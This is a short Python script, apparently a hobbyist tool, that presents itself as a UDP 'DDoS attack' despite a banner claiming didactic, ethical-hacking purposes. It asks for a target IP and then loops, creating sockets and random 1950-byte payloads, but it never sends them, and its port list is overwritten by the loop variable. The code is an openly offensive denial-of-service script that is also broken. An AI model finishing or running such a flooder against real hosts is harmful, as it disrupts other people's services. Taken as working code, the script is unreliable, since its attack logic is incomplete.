import socket
import random
import time
import os

time.sleep(1)
os.system('clear')
time.sleep(1)
os.system('figlet Ataque')
time.sleep(1)
os.system('figlet DDoS')
time.sleep(5)

print("""

===================Willian======================》

CRIADOR: WILLIAN DE OLIVEIRA

DATA: 13/10/2022

ATAQUE DDOS - ETHICAL HACKER

SOFTWARE CRIADO PARA FINS DIDATICOS

====================Willian=====================》
""")
time.sleep(5)

user_agent = 'https://developers.whatismybrowser.com/useragents/parse/?analyse-my-user-agent=yes'
user_agent = 'Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0'

IP = input('Digite o IP: ')
ports = [22,80,144,777,8080]
time.sleep(2)
os.system('clear')
os.system('figlet Aguarde')
time.sleep(5)

for ports in range(10000):
          s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
          bytes = random._urandom(1950)
          print('Ataque 💥')


